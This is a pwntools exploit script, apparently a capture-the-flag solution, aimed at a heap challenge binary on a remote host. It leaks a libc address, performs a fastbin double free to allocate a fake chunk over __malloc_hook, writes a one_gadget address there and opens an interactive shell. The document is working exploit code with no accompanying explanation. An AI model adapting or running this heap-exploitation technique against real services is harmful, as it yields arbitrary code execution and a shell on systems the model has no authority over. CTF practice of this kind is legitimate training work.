#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./ying_liu_zhi_zhu')
p = remote('112.126.71.170', 45123)

def add():
  p.sendline('1')

def delete(idx):
  p.sendline('2')
  p.sendline(str(idx))

def edit(idx, payload):
  p.sendline('3')
  p.sendline(str(idx))
  p.send(payload)

def show(idx):
  p.sendline('4')
  p.sendline(str(idx))

def glob(pattern):
  p.sendline('5')
  p.sendline(pattern)
 
if __name__ == "__main__":
  __malloc_hook_offset = 0x00000000003c4b10

  glob('/dev*')
  add() # 0
  show(0)
  leak = u64(p.recv(8)) - 88 - 0x10 - __malloc_hook_offset
  fake_chunk = leak + __malloc_hook_offset - 0x23
  success('LIBC:\t' + str(hex(leak)))
  pause()
  add() # 1

  delete(0)
  delete(1)
  delete(0)

  add() # 2
  edit(2, p64(fake_chunk) + '\n')
  add() # 3
  add() # 4
  add() # 5
  
  og = [0x45216, 0x4526a, 0xf02a4, 0xf1207]
  edit(5, 'a' * 0x13 + p64(og[3] + leak) + '\n')


  success('LIBC:\t' + str(hex(leak)))
  # gdb.attach(p)
  p.interactive()